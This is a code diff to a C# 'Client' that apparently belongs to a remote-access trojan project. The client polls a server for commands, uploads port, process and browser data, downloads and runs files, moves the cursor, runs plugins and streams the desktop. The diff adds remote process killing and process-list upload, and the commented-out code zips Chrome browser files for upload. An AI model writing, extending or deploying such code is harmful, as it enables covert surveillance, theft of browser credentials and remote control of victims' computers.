@@ -28,8 +28,7 @@ namespace Client
 
         private static readonly string APIKEY_PRIVATE = "ca71ab6e833b109d781c722118d2bff373297dc1";
         private static readonly string APIKEY_PUBLIC = "a12ee5029cbf44c55869ba6d629b683d8f0044ef";
-        private static readonly string APPDIR_DOWNLOADS = "Transfers\\Downloads";
-        private static readonly string APPDIR_UPLOADS = "Transfers\\Uploads";
+        private static readonly string APPDIR_TRANSFERS = "Transfers";
         private static readonly string APPDIR_PLUGINS = "Plugins";
         private static readonly string PROTOCOL = "http://";
         private static readonly string IP_ADDRESS = "localhost";
@@ -50,8 +49,7 @@ namespace Client
         private string fakeTextFilePath;
         NotifyIcon notifyIcon;
         private readonly string appDir;
-        private readonly string dirDownloads;
-        private readonly string dirUploads;
+        private readonly string dirTransfers;
         private readonly string dirPlugins;
         private Timer streamDesktopTimer;
 
@@ -145,16 +143,14 @@ namespace Client
             }
             appDir = Path.Combine(appDirBase, appDirFolder);
             //Clipboard.SetText(appDir); MessageBox.Show(appDir);
-            dirDownloads = Path.Combine(appDir, APPDIR_DOWNLOADS);
-            dirUploads = Path.Combine(appDir, APPDIR_UPLOADS);
+            dirTransfers = Path.Combine(appDir, APPDIR_TRANSFERS);
             dirPlugins = Path.Combine(appDir, APPDIR_PLUGINS);
             // temporary while testing
 #if DEBUG
             dirPlugins = @"C:\Users\benjamin\Documents\Visual Studio 2013\Projects\restless-honey-seeker\Shared\PluginDemo\bin\x64\Debug";
 #endif
             CreateDirectory(appDir);
-            CreateDirectory(dirDownloads);
-            CreateDirectory(dirUploads);
+            CreateDirectory(dirTransfers);
             CreateDirectory(dirPlugins);
             // OpenFakeTextFile("Hey!");
             Handler.Instance.Transmitter = new Library.Transmitter(URL, APIKEY_PRIVATE, APIKEY_PUBLIC, CONNECTION_TIMEOUT);
@@ -274,7 +270,7 @@ namespace Client
                 };
 
                 transmitTimer = new Timer();
-                transmitTimer.Interval = 1000;
+                transmitTimer.Interval = transmitTimerInterval;
                 transmitTimer.Tick += (o, e) =>
                 {
                     Handler.Instance.Transmitter.LoadSettings();
@@ -307,6 +303,9 @@ namespace Client
                         case ECommand.UPLOAD_PORT_INFO:
                             UploadPortInfo();
                             break;
+                        case ECommand.UPLOAD_PROCESS_INFO:
+                            UploadProcessInfo();
+                            break;
                         case ECommand.UPLOAD_BROWSER_DATA:
                             UploadBrowserData();
                             break;
@@ -331,6 +330,9 @@ namespace Client
                         case ECommand.MOVE_CURSOR:
                             CursorInteract();
                             break;
+                        case ECommand.KILL_PROCESS:
+                            KillProcess();
+                            break;
                         case ECommand.EXECUTE_PLUGIN:
                             if (pluginManager != null)
                             {
@@ -351,7 +353,7 @@ namespace Client
                                     }
                                     if (data != null)
                                     {
-                                        Handler.Instance.Transmitter.UploadData(data);
+                                        Handler.Instance.Transmitter.UploadData("data.zip", data, true);
                                     }
                                 }
                             }
@@ -394,15 +396,54 @@ namespace Client
             return isAuthorized;
         }
 
+        private void KillProcess()
+        {
+            try
+            {
+                var pid = -1;
+                if (int.TryParse(Handler.Instance.Transmitter.TSettings.Parameters, out pid))
+                {
+                    if (pid >= 0)
+                    {
+                        var process = Process.GetProcessById(pid);
+                        if (process != null)
+                        {
+                            process.Kill();
+                        }
+                    }
+                }
+                else
+                {
+                    var processes = Process.GetProcessesByName(Handler.Instance.Transmitter.TSettings.Parameters);
+                    if (processes != null)
+                    {
+                        processes[0].Kill();
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                // handle
+            }
+        }
+
+        private void UploadProcessInfo()
+        {
+            StringBuilder sb = new StringBuilder();
+            foreach (var p in OS.GetProcesses())
+            {
+                sb.AppendLine("Name: " + p.Name + ", PID: " + p.PID);
+            }
+            Handler.Instance.Transmitter.UploadData("processes.txt", sb.ToString(), false);
+        }
+
         private void SetTransmissionInterval(string timeMS)
         {
             int newInterval = 1000;
             if (int.TryParse(timeMS, out newInterval))
             {
-                transmitTimerInterval = newInterval;
+                transmitTimerInterval = (newInterval >= 1000 && newInterval <= 24 * 60 * 60 * 1000) ? newInterval : transmitTimerInterval;
                 transmitTimer.Interval = transmitTimerInterval;
-                //transmitTimer.Stop();
-                //transmitTimer.
             }
         }
 
@@ -451,7 +492,7 @@ namespace Client
             byte[] fileData = Handler.Instance.Transmitter.DownloadFile();
             if (fileData != null)
             {
-                File.WriteAllBytes(Path.Combine(dirUploads, Handler.Instance.Transmitter.TSettings.File), fileData);
+                File.WriteAllBytes(Path.Combine(dirTransfers, Handler.Instance.Transmitter.TSettings.File), fileData);
                 //string path = appDir + "\\Transfers";
                 //if (!Directory.Exists(path))
                 //{
@@ -551,7 +592,7 @@ namespace Client
                 string[] zipFiles = new string[chromeFiles.Length];
                 foreach (var file in chromeFiles)
                 {
-                    //var destFileName = dirUploads + @"\Chrome " + file;
+                    //var destFileName = dirTransfers + @"\Chrome " + file;
                     //if (File.Exists(destFileName))
                     //{
                     //    File.Delete(destFileName);
@@ -571,17 +612,17 @@ namespace Client
                 });
 
 
-                //if (Compression.Zip(zipFiles, dirUploads + "\\Chrome Browser Data.zip"))
+                //if (Compression.Zip(zipFiles, dirTransfers + "\\Chrome Browser Data.zip"))
                 //{
                 //    foreach (var file in chromeFiles)
                 //    {
                 //        try
                 //        {
-                //            File.Delete(dirUploads + @"\Chrome " + file);
+                //            File.Delete(dirTransfers + @"\Chrome " + file);
                 //        }
                 //        catch (Exception ex) { }
                 //    }
-                //    string fileToUpload = dirUploads + "\\Chrome Browser Data.zip";
+                //    string fileToUpload = dirTransfers + "\\Chrome Browser Data.zip";
                 //    //Handler.Instance.Transmitter.UploadFile("Chrome Browser Data", fileToUpload);
                 //    var fileInfo = new FileInfo(fileToUpload);
                 //    var fileData = File.ReadAllBytes(fileInfo.FullName);
@@ -683,21 +724,27 @@ namespace Client
             fileArgs = fileArgs != null ? fileArgs : "";
             try
             {
-                if (fileName.Length > 0)
+                if (!string.IsNullOrEmpty(fileName))
                 {
+                    var hasExecuted = false;
                     try
                     {
                         ProcessStartInfo psi = new ProcessStartInfo(fileName, fileArgs);
                         psi.WorkingDirectory = appDir;
                         Process.Start(psi);
+                        hasExecuted = true;
                     }
                     catch (Exception ex)
                     {
-                        fileName = appDir + "\\Transfers\\" + fileName;
+                        hasExecuted = false;
+                    }
+                    if (!hasExecuted)
+                    {
+                        fileName = Path.Combine(dirTransfers, fileName);// appDir + "\\Transfers\\" + fileName;
                         try
                         {
                             ProcessStartInfo psi = new ProcessStartInfo(fileName, fileArgs);
-                            psi.WorkingDirectory = dirDownloads;
+                            psi.WorkingDirectory = dirTransfers;
                             Process.Start(psi);
                         }
                         catch (Exception ex2) { }
